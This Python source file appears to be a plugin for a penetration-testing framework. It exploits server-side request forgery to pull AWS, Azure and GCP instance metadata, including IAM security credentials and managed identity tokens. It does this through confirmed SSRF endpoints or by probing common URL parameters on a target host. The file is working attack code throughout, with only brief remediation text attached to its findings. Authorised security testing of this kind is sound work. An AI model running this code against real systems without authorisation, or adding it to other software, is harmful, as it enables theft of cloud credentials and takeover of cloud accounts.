"""Cloud metadata SSRF â€” extracts cloud instance metadata via confirmed SSRF."""

from __future__ import annotations

import json
from typing import ClassVar
from urllib.parse import quote

from basilisk.core.plugin import BasePlugin, PluginCategory, PluginMeta
from basilisk.models.result import Finding, PluginResult
from basilisk.models.target import Target

# Metadata URLs by cloud provider
AWS_METADATA_PATHS = [
    ("http://169.254.169.254/latest/meta-data/", "AWS IMDSv1 root"),
    ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "AWS IAM roles"),
    ("http://169.254.169.254/latest/meta-data/hostname", "AWS hostname"),
    ("http://169.254.169.254/latest/meta-data/local-ipv4", "AWS internal IP"),
    ("http://169.254.169.254/latest/dynamic/instance-identity/document", "AWS instance ID"),
    ("http://169.254.169.254/latest/user-data", "AWS user-data"),
]

AZURE_METADATA_PATHS = [
    (
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "Azure instance metadata",
    ),
    (
        "http://169.254.169.254/metadata/identity/oauth2/token"
        "?api-version=2018-02-01&resource=https://management.azure.com/",
        "Azure managed identity token",
    ),
]

GCP_METADATA_PATHS = [
    (
        "http://metadata.google.internal/computeMetadata/v1/?recursive=true",
        "GCP full metadata",
    ),
    (
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/",
        "GCP service accounts",
    ),
    (
        "http://metadata.google.internal/computeMetadata/v1/project/project-id",
        "GCP project ID",
    ),
]

# Common SSRF-injectable URL parameters
SSRF_PARAMS = ["url", "redirect", "next", "target", "image", "proxy", "fetch", "uri", "src"]


class CloudMetadataSsrfPlugin(BasePlugin):
    meta: ClassVar[PluginMeta] = PluginMeta(
        name="cloud_metadata_ssrf",
        display_name="Cloud Metadata SSRF",
        category=PluginCategory.PENTESTING,
        description="Extracts cloud instance metadata via confirmed SSRF endpoints",
        depends_on=["ssrf_check", "cloud_detect"],
        produces=["cloud_metadata"],
        timeout=45.0,
    )

    async def run(self, target: Target, ctx) -> PluginResult:
        if ctx.http is None:
            return PluginResult.fail(
                self.meta.name, target.host, error="HTTP client not available"
            )

        findings: list[Finding] = []
        metadata: list[dict] = []

        # Get confirmed SSRF endpoints
        ssrf_key = f"ssrf_check:{target.host}"
        ssrf_result = ctx.pipeline.get(ssrf_key)
        ssrf_endpoints: list[dict] = []

        if ssrf_result and ssrf_result.ok:
            ssrf_endpoints = ssrf_result.data.get("ssrf_endpoints", [])

        # Get cloud provider info
        cloud_key = f"cloud_detect:{target.host}"
        cloud_result = ctx.pipeline.get(cloud_key)
        cloud_providers: list[str] = []

        if cloud_result and cloud_result.ok:
            cloud_providers = cloud_result.data.get("providers", [])

        # Build metadata targets based on cloud provider
        meta_targets = self._select_metadata_targets(cloud_providers)

        # Phase 1: Use confirmed SSRF endpoints
        for ep in ssrf_endpoints:
            if ctx.should_stop:
                break

            ep_url = ep.get("url", "") if isinstance(ep, dict) else str(ep)
            ep_param = ep.get("param", "url") if isinstance(ep, dict) else "url"

            if not ep_url:
                continue

            for meta_url, desc in meta_targets:
                if ctx.should_stop:
                    break

                headers = self._headers_for_url(meta_url)
                result = await self._try_ssrf_metadata(
                    ctx, ep_url, ep_param, meta_url, headers,
                )
                if result:
                    metadata.append({
                        "endpoint": ep_url,
                        "metadata_url": meta_url,
                        "description": desc,
                        "data": result,
                    })
                    severity = (
                        "critical" if "credentials" in desc.lower()
                        or "token" in desc.lower()
                        or "iam" in desc.lower()
                        else "high"
                    )
                    finding_fn = (
                        Finding.critical if severity == "critical"
                        else Finding.high
                    )
                    findings.append(finding_fn(
                        f"Cloud metadata via SSRF: {desc}",
                        description=(
                            f"Extracted {desc} via SSRF on {ep_url}"
                        ),
                        evidence=str(result)[:300],
                        remediation=(
                            "Fix SSRF vulnerability. Use IMDSv2 (AWS). "
                            "Block metadata IPs in egress firewall."
                        ),
                        tags=["pentesting", "ssrf", "cloud-metadata"],
                    ))

        # Phase 2: Probe common URL parameters if no confirmed SSRF
        if not ssrf_endpoints and not ctx.should_stop:
            base_url = ""
            for scheme in ("https", "http"):
                try:
                    async with ctx.rate:
                        await ctx.http.head(
                            f"{scheme}://{target.host}/", timeout=5.0,
                        )
                        base_url = f"{scheme}://{target.host}"
                        break
                except Exception:
                    continue

            if base_url:
                for param in SSRF_PARAMS[:5]:  # Test top-5 params
                    if ctx.should_stop:
                        break
                    for meta_url, desc in meta_targets[:3]:  # Top-3 metadata URLs
                        if ctx.should_stop:
                            break
                        probe_url = f"{base_url}/?{param}={quote(meta_url)}"
                        headers = self._headers_for_url(meta_url)
                        result = await self._probe_blind_ssrf(
                            ctx, probe_url, meta_url, headers,
                        )
                        if result:
                            metadata.append({
                                "endpoint": probe_url,
                                "metadata_url": meta_url,
                                "description": desc,
                                "data": result,
                            })
                            findings.append(Finding.critical(
                                f"Blind SSRF to cloud metadata: {desc}",
                                description=(
                                    f"Parameter '{param}' fetches {meta_url}"
                                ),
                                evidence=str(result)[:300],
                                remediation=(
                                    "Validate/whitelist URLs. Block metadata IPs."
                                ),
                                tags=["pentesting", "ssrf", "cloud-metadata"],
                            ))
                            break
                    if findings:
                        break

        if not findings:
            findings.append(Finding.info(
                "No cloud metadata accessible via SSRF",
                tags=["pentesting", "ssrf", "cloud-metadata"],
            ))

        return PluginResult.success(
            self.meta.name, target.host,
            findings=findings,
            data={"cloud_metadata": metadata},
        )

    @staticmethod
    def _select_metadata_targets(
        providers: list[str],
    ) -> list[tuple[str, str]]:
        """Select metadata URLs based on detected cloud providers."""
        targets: list[tuple[str, str]] = []

        providers_lower = [p.lower() for p in providers]

        if any("aws" in p or "amazon" in p for p in providers_lower):
            targets.extend(AWS_METADATA_PATHS)
        if any("azure" in p or "microsoft" in p for p in providers_lower):
            targets.extend(AZURE_METADATA_PATHS)
        if any("gcp" in p or "google" in p for p in providers_lower):
            targets.extend(GCP_METADATA_PATHS)

        # If no specific provider detected, try all
        if not targets:
            targets.extend(AWS_METADATA_PATHS[:3])
            targets.extend(AZURE_METADATA_PATHS[:1])
            targets.extend(GCP_METADATA_PATHS[:1])

        return targets

    @staticmethod
    def _headers_for_url(meta_url: str) -> dict[str, str]:
        """Return required headers for specific cloud metadata endpoints."""
        headers: dict[str, str] = {}
        if "metadata.google.internal" in meta_url:
            headers["Metadata-Flavor"] = "Google"
        if "169.254.169.254/metadata" in meta_url and "api-version" in meta_url:
            headers["Metadata"] = "true"
        return headers

    @staticmethod
    async def _try_ssrf_metadata(
        ctx, endpoint_url: str, param: str,
        metadata_url: str, headers: dict[str, str],
    ) -> dict | None:
        """Try to fetch cloud metadata through a confirmed SSRF endpoint."""
        sep = "&" if "?" in endpoint_url else "?"
        url = f"{endpoint_url}{sep}{param}={quote(metadata_url)}"

        try:
            async with ctx.rate:
                resp = await ctx.http.get(url, headers=headers or None, timeout=10.0)
                if resp.status != 200:
                    return None

                body = await resp.text(encoding="utf-8", errors="replace")
                if not body or len(body) < 5:
                    return None

                # Check for cloud metadata indicators
                if any(indicator in body for indicator in (
                    "ami-", "instance-id", "security-credentials",
                    "subscriptionId", "resourceGroupName",
                    "computeMetadata", "project-id",
                    "iam/", "meta-data",
                )):
                    try:
                        return json.loads(body)
                    except (json.JSONDecodeError, ValueError):
                        return {"raw": body[:1000]}
        except Exception:
            pass
        return None

    @staticmethod
    async def _probe_blind_ssrf(
        ctx, probe_url: str, metadata_url: str,
        headers: dict[str, str],
    ) -> dict | None:
        """Probe a URL parameter for blind SSRF to metadata endpoint."""
        try:
            async with ctx.rate:
                resp = await ctx.http.get(
                    probe_url, headers=headers or None, timeout=10.0,
                )
                if resp.status != 200:
                    return None

                body = await resp.text(encoding="utf-8", errors="replace")
                if not body or len(body) < 10:
                    return None

                # Look for metadata content in response
                indicators = [
                    "ami-", "instance-id", "security-credentials",
                    "subscriptionId", "computeMetadata",
                ]
                if any(i in body for i in indicators):
                    try:
                        return json.loads(body)
                    except (json.JSONDecodeError, ValueError):
                        return {"raw": body[:1000]}
        except Exception:
            pass
        return None
